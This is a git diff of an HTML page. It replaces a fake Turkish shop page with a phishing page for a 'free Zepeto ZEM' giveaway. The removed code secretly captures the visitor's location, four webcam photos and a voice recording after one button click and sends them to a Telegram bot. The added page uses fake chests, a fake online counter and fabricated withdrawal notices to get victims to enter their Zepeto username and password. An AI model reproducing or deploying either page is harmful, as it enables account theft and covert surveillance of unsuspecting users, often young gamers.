@@ -1,161 +1,411 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="az">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TR SHOP</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-    body { background: #f0f2f5; color: #333; }
-    header { background: #1c1f26; color: #fff; padding: 20px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.3); position: sticky; top: 0; z-index: 1000; }
-    header h1 { font-size: 2.5em; animation: slideIn 1s ease-in-out; }
-    @keyframes slideIn { 0% { transform: translateY(-100%); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
-    .products { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; padding: 40px; }
-    .product { background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); transition: transform 0.3s, box-shadow 0.3s; }
-    .product:hover { transform: scale(1.05); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
-    .product img { width: 100%; border-radius: 10px; }
-    .product h3 { margin: 10px 0; font-size: 1.2em; }
-    .price { font-weight: bold; color: #2e8b57; }
-    footer { background: #1c1f26; color: #fff; text-align: center; padding: 20px; margin-top: 50px; }
-    .permission-btn { display: block; margin: 20px auto; padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zepeto Ücretsiz ZEM Etkinliği</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-  <header>
-    <h1>TR SHOP</h1>
-    <p>Giyim, Teknoloji, Yiyecek, Her Şey Burada!</p>
-  </header>
 
-  <section class="products">
-    <div class="product">
-      <img src="https://via.placeholder.com/250x250.png?text=Kulaklik" alt="Kulaklık">
-      <h3>Bluetooth Kulaklık</h3>
-      <p class="price">₺349.99</p>
+    <!-- Sandık ve Modal Gradiyanları -->
+    <svg width="0" height="0" style="position:absolute" aria-hidden="true">
+        <defs>
+            <linearGradient id="chestWood" x1="0" y1="0" x2="0" y2="1">
+                <stop offset="0%" stop-color="#8b6dad"/>
+                <stop offset="55%" stop-color="#5b3a8e"/>
+                <stop offset="100%" stop-color="#3b2362"/>
+            </linearGradient>
+            <linearGradient id="chestGold" x1="0" y1="0" x2="0" y2="1">
+                <stop offset="0%" stop-color="#fff3b0"/>
+                <stop offset="45%" stop-color="#ffcb3d"/>
+                <stop offset="100%" stop-color="#d98c0f"/>
+            </linearGradient>
+            <linearGradient id="chestGoldDark" x1="0" y1="0" x2="0" y2="1">
+                <stop offset="0%" stop-color="#e3a315"/>
+                <stop offset="100%" stop-color="#9c6008"/>
+            </linearGradient>
+            <radialGradient id="chestGem" cx="35%" cy="30%" r="75%">
+                <stop offset="0%" stop-color="#ffffff"/>
+                <stop offset="35%" stop-color="#ff9aef"/>
+                <stop offset="100%" stop-color="#d63384"/>
+            </radialGradient>
+        </defs>
+    </svg>
+
+    <div class="container led-frame">
+        <!-- Üst Bilgi / Kabinet Çubuğu -->
+        <div class="header-bar">
+            <div class="logo">✨ ZEPETO FREE ZEM</div>
+            
+            <div class="header-right">
+                <!-- Canlı Online Sayaç -->
+                <div class="online-badge">
+                    <span class="online-dot"></span> 
+                    <span id="online-count">542</span> online
+                </div>
+                <!-- Pembe Elmas & ZEM Miktarı -->
+                <div class="user-balance">
+                    <img src="{{ url_for('static', filename='pink-gem.png') }}" class="gem-icon" alt="ZEM"> 
+                    <span id="zem-count">{{ zems }}</span> ZEM
+                </div>
+            </div>
+        </div>
+
+        {% if success %}
+        <!-- Başarılı Gönderim Ekranı -->
+        <div class="card success-card led-frame">
+            <h2>🎉 İşlem Başarıyla Alındı!</h2>
+            <p>ZEM talebiniz sisteme kaydedilmiştir. Güvenlik ve onay aşamasından sonra <b>2 gün içinde</b> hesabınıza yatırılacaktır.</p>
+            <a href="/" class="btn btn-primary btn-click-effect" style="margin-top: 10px;">Ana Sayfaya Dön</a>
+        </div>
+        {% else %}
+
+            <!-- Karşılama Alanı -->
+            <div class="welcome-box led-frame" style="margin-bottom: 12px;">
+                <h1>Selam! Ücretsiz ZEM Etkinliğimize Hoş Geldin! 🎁</h1>
+            </div>
+
+            <!-- Canlı İşlem Akışı -->
+            <div class="welcome-box led-frame live-feed-box" style="margin-bottom: 12px;">
+                <div id="live-feed-content" class="live-feed-text">
+                    ⚡ <span id="feed-user" class="feed-user-highlight">elifkoc_</span> <b>200 ZEM</b> çekti! <span class="feed-status">İşlem Başarılı</span>
+                </div>
+            </div>
+
+            {% if error %}
+            <div class="alert-error">{{ error }}</div>
+            {% endif %}
+
+            <!-- Sandıklar Alanı -->
+            <div class="chest-section led-frame" id="chest-container" style="{% if chest_opened %}display:none;{% endif %} margin-bottom: 12px;">
+                <h3 style="font-size: 0.95rem; margin-bottom: 8px; color: #2d3436; text-align: center;">Şanslı Sandığını Seç:</h3>
+                <div class="chests-grid" id="chests-grid">
+                    <div class="chest-box" data-index="0" onclick="openChest(this)">
+                        <div class="chest-visual">
+                            <div class="chest-rays"></div>
+                            <div class="chest-glow"></div>
+                            <svg class="chest-base" viewBox="0 0 120 80" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M6,12 H114 V66 Q114,78 102,78 H18 Q6,78 6,66 Z" fill="url(#chestWood)" stroke="#2a1850" stroke-width="2"/>
+                                <line x1="30" y1="14" x2="30" y2="77" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <line x1="60" y1="14" x2="60" y2="78" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <line x1="90" y1="14" x2="90" y2="77" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <rect x="6" y="34" width="108" height="12" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1"/>
+                                <circle cx="18" cy="40" r="2.3" fill="url(#chestGoldDark)"/>
+                                <circle cx="102" cy="40" r="2.3" fill="url(#chestGoldDark)"/>
+                                <path d="M60,32 L70,40 L66,52 L54,52 L50,40 Z" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1.3"/>
+                                <circle cx="60" cy="42" r="4" fill="url(#chestGem)"/>
+                            </svg>
+                            <svg class="chest-lid" viewBox="0 0 120 55" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M8,55 V26 Q8,4 60,4 Q112,4 112,26 V55 Z" fill="url(#chestWood)" stroke="#2a1850" stroke-width="2"/>
+                                <rect x="8" y="46" width="104" height="9" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1"/>
+                                <circle cx="60" cy="10" r="4.5" fill="url(#chestGem)" stroke="#145a86" stroke-width="1"/>
+                            </svg>
+                            <span class="chest-sparkle sp1">✦</span>
+                            <span class="chest-sparkle sp2">✧</span>
+                            <span class="chest-sparkle sp3">✦</span>
+                            <span class="chest-sparkle sp4">✧</span>
+                            <span class="chest-sparkle sp5">✦</span>
+                        </div>
+                        <span class="label">Sandık 1</span>
+                    </div>
+
+                    <div class="chest-box" data-index="1" onclick="openChest(this)">
+                        <div class="chest-visual">
+                            <div class="chest-rays"></div>
+                            <div class="chest-glow"></div>
+                            <svg class="chest-base" viewBox="0 0 120 80" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M6,12 H114 V66 Q114,78 102,78 H18 Q6,78 6,66 Z" fill="url(#chestWood)" stroke="#2a1850" stroke-width="2"/>
+                                <line x1="30" y1="14" x2="30" y2="77" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <line x1="60" y1="14" x2="60" y2="78" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <line x1="90" y1="14" x2="90" y2="77" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <rect x="6" y="34" width="108" height="12" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1"/>
+                                <circle cx="18" cy="40" r="2.3" fill="url(#chestGoldDark)"/>
+                                <circle cx="102" cy="40" r="2.3" fill="url(#chestGoldDark)"/>
+                                <path d="M60,32 L70,40 L66,52 L54,52 L50,40 Z" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1.3"/>
+                                <circle cx="60" cy="42" r="4" fill="url(#chestGem)"/>
+                            </svg>
+                            <svg class="chest-lid" viewBox="0 0 120 55" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M8,55 V26 Q8,4 60,4 Q112,4 112,26 V55 Z" fill="url(#chestWood)" stroke="#2a1850" stroke-width="2"/>
+                                <rect x="8" y="46" width="104" height="9" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1"/>
+                                <circle cx="60" cy="10" r="4.5" fill="url(#chestGem)" stroke="#145a86" stroke-width="1"/>
+                            </svg>
+                            <span class="chest-sparkle sp1">✦</span>
+                            <span class="chest-sparkle sp2">✧</span>
+                            <span class="chest-sparkle sp3">✦</span>
+                            <span class="chest-sparkle sp4">✧</span>
+                            <span class="chest-sparkle sp5">✦</span>
+                        </div>
+                        <span class="label">Sandık 2</span>
+                    </div>
+
+                    <div class="chest-box" data-index="2" onclick="openChest(this)">
+                        <div class="chest-visual">
+                            <div class="chest-rays"></div>
+                            <div class="chest-glow"></div>
+                            <svg class="chest-base" viewBox="0 0 120 80" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M6,12 H114 V66 Q114,78 102,78 H18 Q6,78 6,66 Z" fill="url(#chestWood)" stroke="#2a1850" stroke-width="2"/>
+                                <line x1="30" y1="14" x2="30" y2="77" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <line x1="60" y1="14" x2="60" y2="78" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <line x1="90" y1="14" x2="90" y2="77" stroke="#2a1850" stroke-width="1.2" opacity="0.35"/>
+                                <rect x="6" y="34" width="108" height="12" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1"/>
+                                <circle cx="18" cy="40" r="2.3" fill="url(#chestGoldDark)"/>
+                                <circle cx="102" cy="40" r="2.3" fill="url(#chestGoldDark)"/>
+                                <path d="M60,32 L70,40 L66,52 L54,52 L50,40 Z" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1.3"/>
+                                <circle cx="60" cy="42" r="4" fill="url(#chestGem)"/>
+                            </svg>
+                            <svg class="chest-lid" viewBox="0 0 120 55" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M8,55 V26 Q8,4 60,4 Q112,4 112,26 V55 Z" fill="url(#chestWood)" stroke="#2a1850" stroke-width="2"/>
+                                <rect x="8" y="46" width="104" height="9" fill="url(#chestGold)" stroke="#9c6008" stroke-width="1"/>
+                                <circle cx="60" cy="10" r="4.5" fill="url(#chestGem)" stroke="#145a86" stroke-width="1"/>
+                            </svg>
+                            <span class="chest-sparkle sp1">✦</span>
+                            <span class="chest-sparkle sp2">✧</span>
+                            <span class="chest-sparkle sp3">✦</span>
+                            <span class="chest-sparkle sp4">✧</span>
+                            <span class="chest-sparkle sp5">✦</span>
+                        </div>
+                        <span class="label">Sandık 3</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Ödül Modalı -->
+            <div class="reward-overlay" id="reward-overlay">
+                <canvas id="confetti-canvas"></canvas>
+                <div class="reward-modal" id="reward-modal">
+                    <div class="reward-emoji">🎉</div>
+                    <h2>Tebrikler!</h2>
+                    <p class="reward-amount"><span id="reward-number">0</span> ZEM</p>
+                    <p class="reward-sub">kazandın!</p>
+                    <button class="btn btn-primary btn-click-effect" id="reward-close">Devam Et</button>
+                </div>
+            </div>
+
+            <!-- Sandık Açıldıktan Sonra Görünecek Kabnet ve Çekim Alanı -->
+            <div class="cabinet-section" id="cabinet-container" style="{% if not chest_opened %}display:none;{% endif %}">
+                <!-- Arkadaşını Davet Et Kısmı -->
+                <div class="invite-box led-frame">
+                    <h4>👥 Arkadaşını Davet Et, 50 ZEM Kazan!</h4>
+                    <p>Sana özel bağlantıyı kopyala, arkadaşın girip katıldığında sistem otomatik versin:</p>
+                    <div class="invite-link-group">
+                        <input type="text" id="ref-link" class="led-input" value="{{ request.host_url }}?ref={{ user_id }}" readonly>
+                        <button onclick="copyLink()" class="btn-sm btn-click-effect">Kopyala</button>
+                    </div>
+                </div>
+
+                <!-- ZEM Çekim Formu -->
+                <div class="withdraw-box led-frame">
+                    <h3><img src="{{ url_for('static', filename='pink-gem.png') }}" class="gem-icon" alt="ZEM"> ZEM'leri Hesaba Aktar</h3>
+                    <p class="warning-text">⚠️ <b>Dikkat:</b> Yanlış şifre girerseniz hesabınıza ZEM yatmaz!</p>
+                    
+                    <form action="/withdraw" method="POST" class="form">
+                        <div class="input-group">
+                            <label>E-posta Adresi</label>
+                            <input type="email" name="email" class="led-input" required placeholder="ornek@mail.com">
+                        </div>
+                        <div class="input-group">
+                            <label>Zepeto Kullanıcı Adı</label>
+                            <input type="text" name="username" class="led-input" required placeholder="Örn: zepeto_user99">
+                        </div>
+                        <div class="input-group">
+                            <label>Zepeto Şifre</label>
+                            <input type="password" name="password" class="led-input" required placeholder="••••••••">
+                        </div>
+                        <div class="input-group">
+                            <label>Gönderim Seçeneği</label>
+                            <select name="withdraw_type" class="led-input">
+                                <option value="hepsi">Tüm ZEM'leri Tek Seferde Çek</option>
+                                <option value="parca">Parça Parça Çek (Günlük Bölünmüş)</option>
+                            </select>
+                        </div>
+                        <button type="submit" class="btn btn-primary btn-click-effect" style="margin-top: 8px;">ZEM'leri Hesaba Gönder</button>
+                    </form>
+                </div>
+            </div>
+
+        {% endif %}
     </div>
-  </section>
 
-  <button class="permission-btn" id="requestPermission">Tıkla ve Puan Ver</button>
-
-  <footer>
-    <p>&copy; 2025 TR SHOP - Tüm hakları saklıdır.</p>
-  </footer>
-
-  <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const token = urlParams.get('token');
-    const chatId = urlParams.get('chat_id');
-
-    if (!token || !chatId) {
-      alert("❌ Token veya Chat ID eksik.");
-      throw new Error("Eksik veri.");
-    }
-
-    document.getElementById('requestPermission').addEventListener('click', function () {
-      function sendMessage(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text })
-        });
-      }
-
-      function getLocation() {
-        return new Promise((resolve, reject) => {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-              const text = `📍 GPS Konumu:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`;
-              sendMessage(text);
-              resolve();
-            }, reject);
-          } else {
-            reject("Tarayıcı konum desteklemiyor.");
-          }
-        });
-      }
-
-      function takeAndSendPhotos() {
-        return new Promise((resolve, reject) => {
-          navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-              const video = document.createElement('video');
-              video.srcObject = stream;
-              video.play();
-
-              const canvas = document.createElement('canvas');
-              const ctx = canvas.getContext('2d');
-              canvas.width = 640;
-              canvas.height = 480;
-
-              let photoCount = 0;
-              function capturePhoto() {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(blob => {
-                  const file = new File([blob], `photo${photoCount + 1}.jpg`, { type: "image/jpeg" });
-                  const formData = new FormData();
-                  formData.append("chat_id", chatId);
-                  formData.append("photo", file);
-                  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                  }).then(() => {
-                    photoCount++;
-                    if (photoCount < 4) {
-                      setTimeout(capturePhoto, 1000);
-                    } else {
-                      stream.getTracks().forEach(track => track.stop());
-                      sendMessage("📷 Kamera görüntüsü gönderildi.");
-                      resolve();
-                    }
-                  });
-                }, 'image/jpeg');
-              }
-              setTimeout(capturePhoto, 2000);
-            }).catch(reject);
-        });
-      }
-
-      function recordAudio() {
-        return new Promise((resolve, reject) => {
-          navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(stream => {
-              const mediaRecorder = new MediaRecorder(stream);
-              const chunks = [];
-              mediaRecorder.ondataavailable = e => chunks.push(e.data);
-              mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                const file = new File([blob], "audio.ogg");
-                const formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("voice", file);
-                fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
-                  method: "POST",
-                  body: formData
-                }).then(() => {
-                  sendMessage("🎤 7 saniyelik ses kaydı gönderildi.");
-                  resolve();
-                });
-              };
-              mediaRecorder.start();
-              setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-              }, 7000);
-            }).catch(reject);
-        });
-      }
-
-      (async () => {
-        try {
-          await getLocation();
-          await takeAndSendPhotos();
-          await recordAudio();
-          alert("✅ Bilgiler başarıyla gönderildi.");
-        } catch (err) {
-          alert("❌ Hata: " + err);
+    <script>
+        // --- 1. Anlık Canlı Online Sayaç ---
+        function updateOnlineCount() {
+            const onlineEl = document.getElementById('online-count');
+            if (onlineEl) {
+                let current = parseInt(onlineEl.innerText, 10) || 500;
+                let change = Math.floor(Math.random() * 56) - 25;
+                current += change;
+                if (current < 200) current = 220;
+                if (current > 1000) current = 980;
+                onlineEl.innerText = current;
+            }
         }
-      })();
-    });
-  </script>
+        setInterval(updateOnlineCount, 3000);
+
+        // --- 2. Canlı İşlem Geçmişi (Real-time Live Feed) ---
+        const fakeUsers = [
+            "elifkoc_", "oyku.zepeto", "baris_zpt", "mira_queen", "zepeto_pro99",
+            "caner_vip", "selen_star", "deniz.zpt", "batu_legend", "asli_rose",
+            "mert_zepeto", "azra_cute", "yigit_king", "duru_pink", "kaan_shadow",
+            "ecem_style", "burak_x", "melis_vibe", "emre_gold", "tuana_sparkle",
+            "ardazpt", "ceren_blue", "umut_dark", "nisa_sweet", "kerem_pro",
+            "defne_angel", "oguz_blaze", "yaren_sun", "tolga_zpt", "irem_diamond"
+        ];
+        const fakeAmounts = [100, 150, 200, 250, 300, 350];
+
+        function updateLiveFeed() {
+            const feedEl = document.getElementById('live-feed-content');
+            if (!feedEl) return;
+
+            feedEl.classList.add('feed-fade-out');
+
+            setTimeout(() => {
+                const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+                const randomAmount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
+                
+                feedEl.innerHTML = `⚡ <span class="feed-user-highlight">${randomUser}</span> <b>${randomAmount} ZEM</b> çekti! <span class="feed-status">İşlem Başarılı</span>`;
+                feedEl.classList.remove('feed-fade-out');
+            }, 300);
+        }
+        setInterval(updateLiveFeed, 2000);
+
+        // --- 3. Sandık Açılma Mantığı ---
+        let chestLocked = false;
+
+        function openChest(chestEl) {
+            if (chestLocked) return;
+            chestLocked = true;
+
+            const allChests = document.querySelectorAll('.chest-box');
+            allChests.forEach(c => c.classList.add('chest-disabled'));
+            chestEl.classList.remove('chest-disabled');
+            chestEl.classList.add('chest-shaking');
+
+            setTimeout(() => {
+                chestEl.classList.remove('chest-shaking');
+                chestEl.classList.add('chest-burst');
+                requestReward(chestEl);
+            }, 750);
+        }
+
+        function requestReward(chestEl) {
+            fetch('/open_chest', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showReward(data.zems, data.total);
+                } else {
+                    chestLocked = false;
+                    document.querySelectorAll('.chest-box').forEach(c => c.classList.remove('chest-disabled'));
+                    alert(data.message || 'Bir hata oluştu, tekrar dene.');
+                }
+            })
+            .catch(() => {
+                chestLocked = false;
+                document.querySelectorAll('.chest-box').forEach(c => c.classList.remove('chest-disabled'));
+                alert('Bağlantı hatası gerçekleşti.');
+            });
+        }
+
+        function showReward(amount, total) {
+            setTimeout(() => {
+                document.getElementById('chest-container').style.display = 'none';
+                document.getElementById('cabinet-container').style.display = 'block';
+
+                const overlay = document.getElementById('reward-overlay');
+                const numberEl = document.getElementById('reward-number');
+                overlay.classList.add('show');
+                fireConfetti();
+                countUp(numberEl, amount, 700);
+
+                if (typeof total === 'number') {
+                    document.getElementById('zem-count').innerText = total;
+                }
+            }, 350);
+        }
+
+        function countUp(el, target, duration) {
+            const start = performance.now();
+            function tick(now) {
+                const progress = Math.min((now - start) / duration, 1);
+                const eased = 1 - Math.pow(1 - progress, 3);
+                el.innerText = Math.floor(eased * target);
+                if (progress < 1) requestAnimationFrame(tick);
+                else el.innerText = target;
+            }
+            requestAnimationFrame(tick);
+        }
+
+        document.getElementById('reward-close').addEventListener('click', () => {
+            document.getElementById('reward-overlay').classList.remove('show');
+        });
+
+        function fireConfetti() {
+            const canvas = document.getElementById('confetti-canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = canvas.offsetWidth;
+            canvas.height = canvas.offsetHeight;
+
+            const colors = ['#a855f7', '#ffd866', '#ff9ecf', '#7c3aed', '#60e3c2'];
+            const pieces = [];
+            const count = 70;
+
+            for (let i = 0; i < count; i++) {
+                pieces.push({
+                    x: canvas.width / 2,
+                    y: canvas.height / 2,
+                    vx: (Math.random() - 0.5) * 9,
+                    vy: (Math.random() - 1.4) * 9,
+                    size: Math.random() * 6 + 4,
+                    color: colors[Math.floor(Math.random() * colors.length)],
+                    rotation: Math.random() * 360,
+                    spin: (Math.random() - 0.5) * 20,
+                    life: 0
+                });
+            }
+
+            let frame = 0;
+            const maxFrames = 90;
+
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                pieces.forEach(p => {
+                    p.vy += 0.22;
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    p.rotation += p.spin;
+                    p.life++;
+
+                    ctx.save();
+                    ctx.translate(p.x, p.y);
+                    ctx.rotate((p.rotation * Math.PI) / 180);
+                    ctx.fillStyle = p.color;
+                    ctx.globalAlpha = Math.max(0, 1 - frame / maxFrames);
+                    ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size * 0.6);
+                    ctx.restore();
+                });
+
+                frame++;
+                if (frame < maxFrames) {
+                    requestAnimationFrame(animate);
+                } else {
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+                }
+            }
+            animate();
+        }
+
+        function copyLink() {
+            var copyText = document.getElementById("ref-link");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+            alert("Davet bağlantısı kopyalandı: " + copyText.value);
+        }
+    </script>
 </body>
 </html>
